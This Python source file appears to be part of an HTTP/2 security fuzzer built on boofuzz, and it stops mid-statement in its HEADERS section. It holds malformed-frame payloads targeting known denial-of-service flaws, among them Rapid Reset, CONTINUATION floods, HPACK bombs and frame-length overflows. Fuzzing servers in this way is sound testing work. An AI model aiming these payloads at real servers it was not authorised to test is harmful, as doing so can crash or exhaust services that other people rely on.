"""HTTP/2 Protocol Fuzzer

Optimized for breadth-first coverage and early crash detection.

Test Ordering Strategy (Phases):
    Phase 1 (0-30s): Quick_Coverage - One request per frame type (10 types)
    Phase 2 (30s-3min): High-crash tests - CVE patterns, overflow, HPACK bomb
    Phase 3 (3-6min): CVE-targeted operations - Rapid Reset, CONTINUATION Flood
    Phase 4 (6-9min): Boundary attacks - Frame field limits, stream IDs
    Phase 5 (9min+): Everything else - Standard operations, variations
    Phase 6: Content payload fuzzing - Bodies, user-agents, cookies, auth

Key CVEs Targeted:
    - CVE-2023-44487: HTTP/2 Rapid Reset (RST_STREAM flood)
    - CVE-2024-27316: HTTP/2 CONTINUATION Flood (missing END_HEADERS)
    - CVE-2024-24549: Apache HTTP/2 CONTINUATION Flood
    - CVE-2025-8671: MadeYouReset (server-side stream reset exploitation)
    - HPACK Bomb: Compression ratio attacks on header decoding
"""

import struct
from typing import List, Optional, Tuple

from boofuzz import Block, Byte, DWord, Group, QWord, Request, Size, Static, Word

from ..core.base_fuzzer import BaseFuzzer, RequestInfo
from ..monitors import BaseMonitor
from ..primitives.dynamic import SmartString

import hpack


def _hpack_encode(headers: List[Tuple[str, str]]) -> bytes:
    """Encode headers using the hpack library.

    Uses a fresh Encoder with dynamic table disabled (table_size=0) so each
    call produces self-contained output without cross-request state leakage.

    Args:
        headers: List of (name, value) tuples. Names should be lowercase.

    Returns:
        HPACK-encoded header block bytes.
    """
    encoder = hpack.Encoder()
    encoder.header_table_size = 0
    return encoder.encode(
        [
            (
                name.encode() if isinstance(name, str) else name,
                value.encode() if isinstance(value, str) else value,
            )
            for name, value in headers
        ]
    )


class HTTP2Fuzzer(BaseFuzzer):
    """HTTP/2 Protocol Fuzzer for binary framing protocol security testing

    Tests HTTP/2 frame types, multiplexing, HPACK compression vulnerabilities,
    and protocol violations in frame-based communication.

    Optimized test ordering ensures:
    - All 10 frame types tested within first 30 seconds
    - High-crash tests (overflow, CVE patterns) run in first 3 minutes
    - CVE-targeted operations run in first 6 minutes
    - Boundary attacks run in first 9 minutes
    - Phase 6: Content payload fuzzing (bodies, user-agents, cookies, auth)
    """

    # Frame Types (all 10 defined in RFC 7540)
    DATA = 0x0
    HEADERS = 0x1
    PRIORITY = 0x2
    RST_STREAM = 0x3
    SETTINGS = 0x4
    PUSH_PROMISE = 0x5
    PING = 0x6
    GOAWAY = 0x7
    WINDOW_UPDATE = 0x8
    CONTINUATION = 0x9

    # Frame Flags
    FLAG_END_STREAM = 0x1
    FLAG_END_HEADERS = 0x4
    FLAG_PADDED = 0x8
    FLAG_PRIORITY = 0x20
    FLAG_ACK = 0x1

    # Settings Parameters
    SETTINGS_HEADER_TABLE_SIZE = 0x1
    SETTINGS_ENABLE_PUSH = 0x2
    SETTINGS_MAX_CONCURRENT_STREAMS = 0x3
    SETTINGS_INITIAL_WINDOW_SIZE = 0x4
    SETTINGS_MAX_FRAME_SIZE = 0x5
    SETTINGS_MAX_HEADER_LIST_SIZE = 0x6

    # Error Codes
    NO_ERROR = 0x0
    PROTOCOL_ERROR = 0x1
    INTERNAL_ERROR = 0x2
    FLOW_CONTROL_ERROR = 0x3
    SETTINGS_TIMEOUT = 0x4
    STREAM_CLOSED = 0x5
    FRAME_SIZE_ERROR = 0x6
    REFUSED_STREAM = 0x7
    CANCEL = 0x8
    COMPRESSION_ERROR = 0x9
    CONNECT_ERROR = 0xA
    ENHANCE_YOUR_CALM = 0xB
    INADEQUATE_SECURITY = 0xC
    HTTP_1_1_REQUIRED = 0xD

    # Protocol Options
    PROTOCOL_OPTIONS = {
        "enable_push": {
            "type": bool,
            "default": False,
            "description": "Enable PUSH_PROMISE frame fuzzing",
        },
        "max_frame_size": {
            "type": int,
            "default": 16384,
            "description": "Maximum frame size (16384-16777215)",
        },
        "enable_hpack": {
            "type": bool,
            "default": False,
            "description": "Enable HPACK compression attack testing",
        },
        "initial_window_size": {
            "type": int,
            "default": 65535,
            "description": "Initial window size for flow control",
        },
        "enable_priority": {
            "type": bool,
            "default": False,
            "description": "Enable PRIORITY frame fuzzing (deprecated in RFC 9113)",
        },
        "enable_content_fuzzing": {
            "type": bool,
            "default": True,
            "description": "Enable HTTP-level content payload fuzzing (bodies, headers, user-agents)",
        },
        "url": {
            "type": str,
            "default": None,
            "description": "Custom URL path for content fuzzing (e.g., /api/v1/endpoint)",
        },
        "auth_bearer": {
            "type": str,
            "default": None,
            "description": "Bearer token for Authorization header",
        },
        "cookie": {
            "type": str,
            "default": None,
            "description": "Cookie header value to add to requests",
        },
    }

    @classmethod
    def get_request_definitions(cls) -> List[RequestInfo]:
        """Get static request definitions for --list-requests"""
        return [
            # Phase 1: Quick Coverage (~30 sec)
            RequestInfo(
                "HTTP2_Quick_Coverage", "Quick sweep of all 10 frame types (~30s)", "baseline"
            ),
            # Phase 2: High-Crash Tests (~3 min)
            RequestInfo("HTTP2_Rapid_Reset", "CVE-2023-44487 RST_STREAM flood attack", "cve"),
            RequestInfo(
                "HTTP2_Continuation_Flood", "CVE-2024-27316 CONTINUATION without END_HEADERS", "cve"
            ),
            RequestInfo(
                "HTTP2_Frame_Overflow", "Frame length/payload overflow attacks", "overflow"
            ),
            RequestInfo("HTTP2_HPACK_Bomb", "HPACK compression bomb attacks", "overflow"),
            # Phase 3: CVE-Targeted Operations (~3 min)
            RequestInfo(
                "HTTP2_Protocol_Violations",
                "Protocol rule violations (invalid streams, frames)",
                "protocol",
            ),
            RequestInfo(
                "HTTP2_Settings_Attack", "Invalid SETTINGS values and boundaries", "protocol"
            ),
            RequestInfo(
                "HTTP2_Window_Attack", "WINDOW_UPDATE overflow and flow control abuse", "protocol"
            ),
            # Phase 4: Boundary Attacks (~3 min)
            RequestInfo(
                "HTTP2_Stream_Boundaries",
                "Stream ID boundary testing (0, max, even/odd)",
                "boundary",
            ),
            RequestInfo(
                "HTTP2_Frame_Boundaries", "Frame field boundaries (length, flags, type)", "boundary"
            ),
            # Phase 5: Standard Operations
            RequestInfo("HTTP2_Headers", "HEADERS frame variations (GET, POST, etc.)", "standard"),
            RequestInfo("HTTP2_Data", "DATA frame variations with padding", "standard"),
            RequestInfo("HTTP2_Goaway", "GOAWAY frame with debug data", "standard"),
            RequestInfo("HTTP2_Priority", "PRIORITY frame dependency chains", "standard"),
            RequestInfo("HTTP2_Push_Promise", "PUSH_PROMISE server push testing", "standard"),
            # Phase 6: Content Payload Fuzzing
            RequestInfo("HTTP2_Content_POST_JSON", "JSON body fuzzing over HTTP/2", "content"),
            RequestInfo(
                "HTTP2_Content_POST_Multipart",
                "Multipart file upload fuzzing over HTTP/2",
                "content",
            ),
            RequestInfo(
                "HTTP2_Content_POST_FormEncoded",
                "URL-encoded form body fuzzing over HTTP/2",
                "content",
            ),
            RequestInfo(
                "HTTP2_UserAgent_Fuzzing",
                "User-Agent header fuzzing with browser patterns",
                "headers",
            ),
            RequestInfo("HTTP2_Cookie_Fuzzing", "Cookie header fuzzing over HTTP/2", "headers"),
            RequestInfo("HTTP2_Auth_Fuzzing", "Bearer token and auth header fuzzing", "auth"),
        ]

    def __init__(self, config=None, connection_factory=None):
        self.port = getattr(config, "target_port", 443) if config else 443
        self.target = getattr(config, "target_ip", "localhost") if config else "localhost"
        self.protocol_name = "HTTP2"
        self.use_ssl = True
        self.config = config
        super().__init__(config, connection_factory)

    def _create_frame(self, frame_type: int, flags: int, stream_id: int, payload: bytes) -> bytes:
        """Create an HTTP/2 frame"""
        length = len(payload)
        # Frame header: length (3 bytes) + type (1 byte) + flags (1 byte) + stream_id (4 bytes)
        header = struct.pack(">I", length)[1:]  # 3 bytes for length
        header += struct.pack(">B", frame_type)
        header += struct.pack(">B", flags)
        header += struct.pack(">I", stream_id & 0x7FFFFFFF)  # Clear reserved bit
        return header + payload

    def _encode_hpack_literal(self, name: str, value: str) -> bytes:
        """Encode header as HPACK literal using the hpack library."""
        return _hpack_encode([(name, value)])

    def _encode_hpack_headers(self, headers: List[Tuple[str, str]]) -> bytes:
        """Encode multiple headers as a single HPACK block."""
        return _hpack_encode(headers)

    def _get_url_path(self, default: str = "/") -> str:
        """Get URL path for fuzzing - custom if set, else default."""
        if self.config:
            custom = self.config.get_option("url", None)
            if custom:
                return custom
        return default

    def _define_protocol(self):
        """Define HTTP/2 protocol messages for fuzzing

        Optimized ordering for breadth-first coverage and early crash detection.
        """

        # Get protocol options
        enable_push = self.config.get_option("enable_push", False) if self.config else False
        max_frame_size = self.config.get_option("max_frame_size", 16384) if self.config else 16384
        enable_hpack = self.config.get_option("enable_hpack", False) if self.config else False
        initial_window_size = (
            self.config.get_option("initial_window_size", 65535) if self.config else 65535
        )
        enable_priority = self.config.get_option("enable_priority", False) if self.config else False
        enable_content = (
            self.config.get_option("enable_content_fuzzing", True) if self.config else True
        )

        # ================================================================
        # HTTP/2 Connection Preface (required for all sessions)
        # ================================================================
        preface = Request(
            "http2_preface",
            children=(
                Static(
                    default_value=b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
                ),  # 24-byte connection preface
                # SETTINGS frame (required after preface)
                Static(
                    default_value=self._create_frame(
                        self.SETTINGS,
                        0,
                        0,
                        struct.pack(">HI", self.SETTINGS_ENABLE_PUSH, 0)
                        + struct.pack(">HI", self.SETTINGS_MAX_FRAME_SIZE, max_frame_size)
                        + struct.pack(
                            ">HI", self.SETTINGS_INITIAL_WINDOW_SIZE, initial_window_size
                        ),
                    )
                ),
            ),
        )
        self.session.connect(preface)

        # ================================================================
        # PHASE 1: QUICK COVERAGE (~30 seconds)
        # Touch all 10 frame types once for maximum breadth
        # ================================================================

        if self.is_request_enabled("HTTP2_Quick_Coverage"):
            # All 10 frame types in a single request for rapid coverage
            quick_coverage = Request(
                "HTTP2_Quick_Coverage",
                children=(
                    Group(
                        "frame_type_sweep",
                        values=[
                            # DATA (0x0) - minimal valid frame
                            self._create_frame(self.DATA, self.FLAG_END_STREAM, 1, b"X"),
                            # HEADERS (0x1) - minimal GET request
                            self._create_frame(
                                self.HEADERS,
                                self.FLAG_END_STREAM | self.FLAG_END_HEADERS,
                                3,
                                self._encode_hpack_headers(
                                    [
                                        (":method", "GET"),
                                        (":path", "/"),
                                        (":scheme", "https"),
                                        (":authority", "localhost"),
                                    ]
                                ),
                            ),
                            # PRIORITY (0x2) - basic priority
                            self._create_frame(self.PRIORITY, 0, 5, struct.pack(">IB", 0, 16)),
                            # RST_STREAM (0x3) - cancel stream
                            self._create_frame(
                                self.RST_STREAM, 0, 1, struct.pack(">I", self.CANCEL)
                            ),
                            # SETTINGS (0x4) - empty settings
                            self._create_frame(self.SETTINGS, 0, 0, b""),
                            # PUSH_PROMISE (0x5) - if enabled, otherwise SETTINGS ACK
                            self._create_frame(self.SETTINGS, self.FLAG_ACK, 0, b""),
                            # PING (0x6) - ping frame
                            self._create_frame(
                                self.PING, 0, 0, b"\x00\x01\x02\x03\x04\x05\x06\x07"
                            ),
                            # GOAWAY (0x7) - graceful shutdown
                            self._create_frame(
                                self.GOAWAY, 0, 0, struct.pack(">II", 0, self.NO_ERROR)
                            ),
                            # WINDOW_UPDATE (0x8) - flow control
                            self._create_frame(self.WINDOW_UPDATE, 0, 0, struct.pack(">I", 65535)),
                            # CONTINUATION (0x9) - header continuation
                            self._create_frame(
                                self.CONTINUATION,
                                self.FLAG_END_HEADERS,
                                7,
                                self._encode_hpack_literal("x-test", "value"),
                            ),
                        ],
                    )
                ),
            )
            self.session.connect(quick_coverage)
            self.register_request(
                "HTTP2_Quick_Coverage", "Quick sweep of all 10 frame types (~30s)", "baseline"
            )

        # ================================================================
        # PHASE 2: HIGH-CRASH TESTS (~3 minutes)
        # CVE patterns, overflow attacks, HPACK bomb
        # ================================================================

        if self.is_request_enabled("HTTP2_Rapid_Reset"):
            # CVE-2023-44487: HTTP/2 Rapid Reset Attack
            # Rapidly create and reset streams to exhaust server resources
            rapid_reset = Request(
                "HTTP2_Rapid_Reset_Attack",
                children=(
                    Group(
                        "rapid_reset_pattern",
                        values=[
                            # Pattern 1: Create stream, immediate reset
                            (
                                self._create_frame(
                                    self.HEADERS,
                                    self.FLAG_END_HEADERS,
                                    1,
                                    self._encode_hpack_headers(
                                        [
                                            (":method", "GET"),
                                            (":path", "/"),
                                            (":scheme", "https"),
                                            (":authority", "localhost"),
                                        ]
                                    ),
                                )
                                + self._create_frame(
                                    self.RST_STREAM, 0, 1, struct.pack(">I", self.CANCEL)
                                )
                            ),
                            # Pattern 2: Multiple streams, batch reset
                            (
                                self._create_frame(
                                    self.HEADERS,
                                    self.FLAG_END_HEADERS,
                                    1,
                                    self._encode_hpack_headers(
                                        [
                                            (":method", "GET"),
                                            (":path", "/a"),
                                            (":scheme", "https"),
                                            (":authority", "localhost"),
                                        ]
                                    ),
                                )
                                + self._create_frame(
                                    self.HEADERS,
                                    self.FLAG_END_HEADERS,
                                    3,
                                    self._encode_hpack_headers(
                                        [
                                            (":method", "GET"),
                                            (":path", "/b"),
                                            (":scheme", "https"),
                                            (":authority", "localhost"),
                                        ]
                                    ),
                                )
                                + self._create_frame(
                                    self.RST_STREAM, 0, 1, struct.pack(">I", self.CANCEL)
                                )
                                + self._create_frame(
                                    self.RST_STREAM, 0, 3, struct.pack(">I", self.CANCEL)
                                )
                            ),
                            # Pattern 3: Reset with different error codes
                            (
                                self._create_frame(
                                    self.HEADERS,
                                    self.FLAG_END_HEADERS,
                                    5,
                                    self._encode_hpack_headers(
                                        [
                                            (":method", "POST"),
                                            (":path", "/api"),
                                            (":scheme", "https"),
                                            (":authority", "localhost"),
                                        ]
                                    ),
                                )
                                + self._create_frame(
                                    self.RST_STREAM, 0, 5, struct.pack(">I", self.PROTOCOL_ERROR)
                                )
                            ),
                            # Pattern 4: Reset non-existent stream
                            self._create_frame(
                                self.RST_STREAM, 0, 999, struct.pack(">I", self.CANCEL)
                            ),
                            # Pattern 5: Reset stream 0 (invalid)
                            self._create_frame(
                                self.RST_STREAM, 0, 0, struct.pack(">I", self.CANCEL)
                            ),
                        ],
                    )
                ),
            )
            self.session.connect(rapid_reset)
            self.register_request(
                "HTTP2_Rapid_Reset", "CVE-2023-44487 RST_STREAM flood attack", "cve"
            )

        if self.is_request_enabled("HTTP2_Continuation_Flood"):
            # CVE-2024-27316: HTTP/2 CONTINUATION Flood
            # Send HEADERS without END_HEADERS, then flood with CONTINUATION frames
            continuation_flood = Request(
                "HTTP2_Continuation_Flood",
                children=(
                    Group(
                        "continuation_flood_pattern",
                        values=[
                            # Pattern 1: HEADERS without END_HEADERS, then CONTINUATION
                            (
                                self._create_frame(
                                    self.HEADERS,
                                    0,
                                    1,  # No END_HEADERS flag
                                    self._encode_hpack_literal(":method", "GET"),
                                )
                                + self._create_frame(
                                    self.CONTINUATION,
                                    0,
                                    1,
                                    self._encode_hpack_literal(":path", "/"),
                                )
                                + self._create_frame(
                                    self.CONTINUATION,
                                    0,
                                    1,
                                    self._encode_hpack_literal(":scheme", "https"),
                                )
                                + self._create_frame(
                                    self.CONTINUATION,
                                    self.FLAG_END_HEADERS,
                                    1,
                                    self._encode_hpack_literal(":authority", "localhost"),
                                )
                            ),
                            # Pattern 2: Many CONTINUATION frames
                            (
                                self._create_frame(
                                    self.HEADERS, 0, 3, self._encode_hpack_literal(":method", "GET")
                                )
                                + b"".join(
                                    [
                                        self._create_frame(
                                            self.CONTINUATION,
                                            0,
                                            3,
                                            self._encode_hpack_literal(f"x-header-{i}", "value"),
                                        )
                                        for i in range(10)
                                    ]
                                )
                                + self._create_frame(
                                    self.CONTINUATION,
                                    self.FLAG_END_HEADERS,
                                    3,
                                    self._encode_hpack_literal(":path", "/"),
                                )
                            ),
                            # Pattern 3: CONTINUATION on wrong stream (protocol violation)
                            (
                                self._create_frame(
                                    self.HEADERS, 0, 5, self._encode_hpack_literal(":method", "GET")
                                )
                                + self._create_frame(
                                    self.CONTINUATION,
                                    self.FLAG_END_HEADERS,
                                    7,  # Wrong stream!
                                    self._encode_hpack_literal(":path", "/"),
                                )
                            ),
                            # Pattern 4: CONTINUATION without preceding HEADERS
                            self._create_frame(
                                self.CONTINUATION,
                                self.FLAG_END_HEADERS,
                                9,
                                self._encode_hpack_literal(":method", "GET"),
                            ),
                            # Pattern 5: Empty CONTINUATION frames
                            (
                                self._create_frame(
                                    self.HEADERS,
                                    0,
                                    11,
                                    self._encode_hpack_literal(":method", "GET"),
                                )
                                + self._create_frame(self.CONTINUATION, 0, 11, b"")
                                + self._create_frame(self.CONTINUATION, 0, 11, b"")
                                + self._create_frame(
                                    self.CONTINUATION,
                                    self.FLAG_END_HEADERS,
                                    11,
                                    self._encode_hpack_literal(":path", "/"),
                                )
                            ),
                        ],
                    )
                ),
            )
            self.session.connect(continuation_flood)
            self.register_request(
                "HTTP2_Continuation_Flood", "CVE-2024-27316 CONTINUATION without END_HEADERS", "cve"
            )

        if self.is_request_enabled("HTTP2_Frame_Overflow"):
            # Frame length and payload overflow attacks
            frame_overflow = Request(
                "HTTP2_Frame_Overflow",
                children=(
                    Group(
                        "overflow_pattern",
                        values=[
                            # Pattern 1: Frame length claims 16MB but small payload
                            b"\xff\xff\xff"
                            + bytes([self.DATA])
                            + b"\x00"
                            + b"\x00\x00\x00\x01"
                            + b"A" * 100,
                            # Pattern 2: Length claims max but actual payload differs
                            b"\x00\x40\x00"
                            + bytes([self.DATA])
                            + b"\x01"
                            + b"\x00\x00\x00\x01"
                            + b"B" * 50,
                            # Pattern 3: Oversized SETTINGS frame
                            b"\x00\x10\x00"
                            + bytes([self.SETTINGS])
                            + b"\x00"
                            + b"\x00\x00\x00\x00"
                            + b"\x00" * 4096,
                            # Pattern 4: PING with wrong length (not 8)
                            b"\x00\x00\x10"
                            + bytes([self.PING])
                            + b"\x00"
                            + b"\x00\x00\x00\x00"
                            + b"X" * 16,
                            # Pattern 5: WINDOW_UPDATE with wrong length (not 4)
                            b"\x00\x00\x08"
                            + bytes([self.WINDOW_UPDATE])
                            + b"\x00"
                            + b"\x00\x00\x00\x00"
                            + b"Y" * 8,
                            # Pattern 6: RST_STREAM with wrong length (not 4)
                            b"\x00\x00\x08"
                            + bytes([self.RST_STREAM])
                            + b"\x00"
                            + b"\x00\x00\x00\x01"
                            + b"Z" * 8,
                            # Pattern 7: GOAWAY with massive debug data
                            b"\x00\xff\xff"
                            + bytes([self.GOAWAY])
                            + b"\x00"
                            + b"\x00\x00\x00\x00"
                            + b"\x00" * 8
                            + b"D" * 65527,
                            # Pattern 8: PRIORITY with wrong length (not 5)
                            b"\x00\x00\x0a"
                            + bytes([self.PRIORITY])
                            + b"\x00"
                            + b"\x00\x00\x00\x01"
                            + b"P" * 10,
                        ],
                    )
                ),
            )
            self.session.connect(frame_overflow)
            self.register_request(
                "HTTP2_Frame_Overflow", "Frame length/payload overflow attacks", "overflow"
            )

        if self.is_request_enabled("HTTP2_HPACK_Bomb") or enable_hpack:
            # HPACK compression bomb attacks
            hpack_bomb = Request(
                "HTTP2_HPACK_Bomb",
                children=(
                    Group(
                        "hpack_bomb_pattern",
                        values=[
                            # Pattern 1: Header with extremely long length encoding
                            self._create_frame(
                                self.HEADERS,
                                self.FLAG_END_HEADERS,
                                1,
                                b"\x00"  # Literal without indexing
                                + b"\x7f\xff\xff\xff\x00"  # Very long name length
                                + b"A" * 100,
                            ),
                            # Pattern 2: Many small headers that index heavily
                            self._create_frame(
                                self.HEADERS,
                                self.FLAG_END_HEADERS,
                                3,
                                b"".join(
                                    [
                                        self._encode_hpack_literal(f"h{i}", "v" * 100)
                                        for i in range(50)
                                    ]
                                ),
                            ),
                            # Pattern 3: Header value with maximum length
                            self._create_frame(
                                self.HEADERS,
                                self.FLAG_END_HEADERS,
                                5,
                                self._encode_hpack_headers(
                                    [
                                        (":method", "GET"),
                                        (":path", "/"),
                                        (":scheme", "https"),
                                        (":authority", "localhost"),
                                    ]
                                )
                                + b"\x00\x04test\x7f\x80\x7f"
                                + b"X" * 16383,
                            ),
                            # Pattern 4: Huffman-encoded bomb attempt
                            self._create_frame(
                                self.HEADERS,
                                self.FLAG_END_HEADERS,
                                7,
                                b"\x00" + b"\x80\x85" + b"\xff\xff\xff\xff\x00" + b"H" * 200,
                            ),
                            # Pattern 5: Dynamic table overflow attempt
                            self._create_frame(
                                self.HEADERS,
                                self.FLAG_END_HEADERS,
                                9,
                                b"\x3f\xe1\x1f"  # Dynamic table size update to max
                                + self._encode_hpack_literal(":method", "GET"),
                            ),
                        ],
                    )
                ),
            )
            self.session.connect(hpack_bomb)
            self.register_request("HTTP2_HPACK_Bomb", "HPACK compression bomb attacks", "overflow")

        # ================================================================
        # PHASE 3: CVE-TARGETED OPERATIONS (~3 minutes)
        # Protocol violations, invalid settings, window attacks
        # ================================================================

        if self.is_request_enabled("HTTP2_Protocol_Violations"):
            # Protocol rule violations
            protocol_violations = Request(
                "HTTP2_Protocol_Violations",
                children=(
                    Group(
                        "violation",
                        values=[
                            # DATA on stream 0 (connection-level, invalid)
                            self._create_frame(self.DATA, 0, 0, b"DATA!"),
                            # HEADERS on stream 0 (invalid)
                            self._create_frame(
                                self.HEADERS,
                                self.FLAG_END_HEADERS,
                                0,
                                self._encode_hpack_literal(":method", "GET"),
                            ),
                            # HEADERS without END_HEADERS followed by DATA (invalid sequence)
                            (
                                self._create_frame(
                                    self.HEADERS, 0, 1, self._encode_hpack_literal(":method", "GET")
                                )
                                + self._create_frame(self.DATA, self.FLAG_END_STREAM, 1, b"data")
                            ),
                            # Invalid stream ID for PING (must be 0)
                            self._create_frame(self.PING, 0, 1, b"\x00" * 8),
                            # SETTINGS on non-zero stream (invalid)
                            self._create_frame(self.SETTINGS, 0, 1, b""),
                            # SETTINGS ACK with payload (must be empty)
                            self._create_frame(
                                self.SETTINGS, self.FLAG_ACK, 0, b"\x00\x01\x00\x00\x10\x00"
                            ),
                            # Invalid frame type (0xFF)
                            b"\x00\x00\x00" + b"\xff" + b"\x00" + b"\x00\x00\x00\x00",
                            # Duplicate connection preface
                            b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n",
                            # Invalid preface
                            b"PRI * HTTP/1.1\r\n\r\nSM\r\n\r\n",
                            # Even-numbered client stream (clients must use odd)
                            self._create_frame(
                                self.HEADERS,
                                self.FLAG_END_HEADERS,
                                2,
                                self._encode_hpack_literal(":method", "GET"),
                            ),
                            # WINDOW_UPDATE on closed stream
                            self._create_frame(self.WINDOW_UPDATE, 0, 999, struct.pack(">I", 1000)),
                            # GOAWAY on non-zero stream (must be 0)
                            self._create_frame(
                                self.GOAWAY, 0, 1, struct.pack(">II", 0, self.NO_ERROR)
                            ),
                        ],
                    )
                ),
            )
            self.session.connect(protocol_violations)
            self.register_request(
                "HTTP2_Protocol_Violations",
                "Protocol rule violations (invalid streams, frames)",
                "protocol",
            )

        if self.is_request_enabled("HTTP2_Settings_Attack"):
            # Invalid SETTINGS values
            settings_attack = Request(
                "HTTP2_Settings_Attack",
                children=(
                    # Invalid ENABLE_PUSH value (must be 0 or 1)
                    Static(default_value=b"\x00\x00\x06"),
                    Byte(name="type", default_value=self.SETTINGS),
                    Byte(name="flags", default_value=0),
                    DWord(name="stream_id", default_value=0, endian=">"),
                    Group(
                        "invalid_settings",
                        values=[
                            # ENABLE_PUSH > 1
                            struct.pack(">HI", self.SETTINGS_ENABLE_PUSH, 0xFFFFFFFF),
                            # INITIAL_WINDOW_SIZE > 2^31-1
                            struct.pack(">HI", self.SETTINGS_INITIAL_WINDOW_SIZE, 0x80000000),
                            # MAX_FRAME_SIZE < 16384
                            struct.pack(">HI", self.SETTINGS_MAX_FRAME_SIZE, 100),
                            # MAX_FRAME_SIZE > 16777215
                            struct.pack(">HI", self.SETTINGS_MAX_FRAME_SIZE, 0xFFFFFFFF),
                            # Unknown setting ID (should be ignored per spec)
                            struct.pack(">HI", 0xFF00, 0x12345678),
                            # HEADER_TABLE_SIZE very large
                            struct.pack(">HI", self.SETTINGS_HEADER_TABLE_SIZE, 0xFFFFFFFF),
                            # MAX_CONCURRENT_STREAMS = 0
                            struct.pack(">HI", self.SETTINGS_MAX_CONCURRENT_STREAMS, 0),
                        ],
                    ),
                ),
            )
            self.session.connect(settings_attack)
            self.register_request(
                "HTTP2_Settings_Attack", "Invalid SETTINGS values and boundaries", "protocol"
            )

        if self.is_request_enabled("HTTP2_Window_Attack"):
            # WINDOW_UPDATE attacks (CVE-2025-8671 MadeYouReset pattern)
            window_attack = Request(
                "HTTP2_Window_Attack",
                children=(
                    Group(
                        "window_pattern",
                        values=[
                            # Pattern 1: Zero increment (PROTOCOL_ERROR)
                            self._create_frame(self.WINDOW_UPDATE, 0, 0, struct.pack(">I", 0)),
                            # Pattern 2: Increment exceeding 2^31-1 (FLOW_CONTROL_ERROR)
                            self._create_frame(
                                self.WINDOW_UPDATE, 0, 0, struct.pack(">I", 0xFFFFFFFF)
                            ),
                            # Pattern 3: Window update on idle stream
                            self._create_frame(self.WINDOW_UPDATE, 0, 999, struct.pack(">I", 1000)),
                            # Pattern 4: Maximum valid increment
                            self._create_frame(
                                self.WINDOW_UPDATE, 0, 0, struct.pack(">I", 0x7FFFFFFF)
                            ),
                            # Pattern 5: Rapid window updates (resource exhaustion)
                            b"".join(
                                [
                                    self._create_frame(
                                        self.WINDOW_UPDATE, 0, 0, struct.pack(">I", 1)
                                    )
                                    for _ in range(10)
                                ]
                            ),
                            # Pattern 6: Stream-level window overflow attempt
                            self._create_frame(
                                self.WINDOW_UPDATE, 0, 1, struct.pack(">I", 0x7FFFFFFF)
                            ),
                        ],
                    )
                ),
            )
            self.session.connect(window_attack)
            self.register_request(
                "HTTP2_Window_Attack", "WINDOW_UPDATE overflow and flow control abuse", "protocol"
            )

        # ================================================================
        # PHASE 4: BOUNDARY ATTACKS (~3 minutes)
        # Stream ID boundaries, frame field boundaries
        # ================================================================

        if self.is_request_enabled("HTTP2_Stream_Boundaries"):
            # Stream ID boundary testing
            stream_boundaries = Request(
                "HTTP2_Stream_Boundaries",
                children=(
                    Group(
                        "stream_boundary",
                        values=[
                            # Stream 0 (connection-level, only for SETTINGS, PING, GOAWAY, WINDOW_UPDATE)
                            self._create_frame(
                                self.HEADERS,
                                self.FLAG_END_HEADERS,
                                0,
                                self._encode_hpack_literal(":method", "GET"),
                            ),
                            # Stream 1 (minimum odd)
                            self._create_frame(
                                self.HEADERS,
                                self.FLAG_END_HEADERS,
                                1,
                                self._encode_hpack_headers(
                                    [
                                        (":method", "GET"),
                                        (":path", "/"),
                                        (":scheme", "https"),
                                        (":authority", "localhost"),
                                    ]
                                ),
                            ),
                            # Stream 2 (even - invalid for client)
                            self._create_frame(
                                self.HEADERS,
                                self.FLAG_END_HEADERS,
                                2,
                                self._encode_hpack_literal(":method", "GET"),
                            ),
                            # Stream 0x7FFFFFFE (maximum even)
                            self._create_frame(
                                self.HEADERS,
                                self.FLAG_END_HEADERS,
                                0x7FFFFFFE,
                                self._encode_hpack_literal(":method", "GET"),
                            ),
                            # Stream 0x7FFFFFFF (maximum valid)
                            self._create_frame(
                                self.HEADERS,
                                self.FLAG_END_HEADERS,
                                0x7FFFFFFF,
                                self._encode_hpack_headers(
                                    [
                                        (":method", "GET"),
                                        (":path", "/"),
                                        (":scheme", "https"),
                                        (":authority", "localhost"),
                                    ]
                                ),
                            ),
                            # Stream with reserved bit set (should be ignored)
                            b"\x00\x00\x10"
                            + bytes([self.HEADERS])
                            + bytes([self.FLAG_END_HEADERS])
                            + b"\x80\x00\x00\x01"
                            + self._encode_hpack_literal(":method", "GET")[:16],
                        ],
                    )
                ),
            )
            self.session.connect(stream_boundaries)
            self.register_request(
                "HTTP2_Stream_Boundaries",
                "Stream ID boundary testing (0, max, even/odd)",
                "boundary",
            )

        if self.is_request_enabled("HTTP2_Frame_Boundaries"):
            # Frame field boundary testing
            frame_boundaries = Request(
                "HTTP2_Frame_Boundaries",
                children=(
                    Group(
                        "frame_boundary",
                        values=[
                            # Length = 0 for various frame types
                            b"\x00\x00\x00"
                            + bytes([self.DATA])
                            + b"\x01"
                            + b"\x00\x00\x00\x01",  # Empty DATA with END_STREAM
                            b"\x00\x00\x00"
                            + bytes([self.HEADERS])
                            + bytes([self.FLAG_END_HEADERS])
                            + b"\x00\x00\x00\x01",
                            # Maximum length (16777215)
                            b"\xff\xff\xff" + bytes([self.DATA]) + b"\x00" + b"\x00\x00\x00\x01",
                            # All flags set for each frame type
                            b"\x00\x00\x08"
                            + bytes([self.DATA])
                            + b"\xff"
                            + b"\x00\x00\x00\x01"
                            + b"testdata",
                            b"\x00\x00\x01"
                            + bytes([self.SETTINGS])
                            + b"\xff"
                            + b"\x00\x00\x00\x00"
                            + b"X",
                            # Frame type boundaries
                            b"\x00\x00\x00"
                            + b"\x00"
                            + b"\x00"
                            + b"\x00\x00\x00\x01",  # Type 0 (DATA)
                            b"\x00\x00\x00"
                            + b"\x09"
                            + b"\x00"
                            + b"\x00\x00\x00\x01",  # Type 9 (CONTINUATION)
                            b"\x00\x00\x00"
                            + b"\x0a"
                            + b"\x00"
                            + b"\x00\x00\x00\x01",  # Type 10 (unknown)
                            b"\x00\x00\x00"
                            + b"\xfe"
                            + b"\x00"
                            + b"\x00\x00\x00\x01",  # Type 254 (unknown)
                            b"\x00\x00\x00"
                            + b"\xff"
                            + b"\x00"
                            + b"\x00\x00\x00\x01",  # Type 255 (unknown)
                        ],
                    )
                ),
            )
            self.session.connect(frame_boundaries)
            self.register_request(
                "HTTP2_Frame_Boundaries", "Frame field boundaries (length, flags, type)", "boundary"
            )

        # ================================================================
        # PHASE 5: STANDARD OPERATIONS
        # Headers, Data, Goaway, Priority, Push Promise variations
        # ================================================================

        if self.is_request_enabled("HTTP2_Headers"):
            # HEADERS frame variations
            headers_payload = self._encode_hpack_headers(
                [
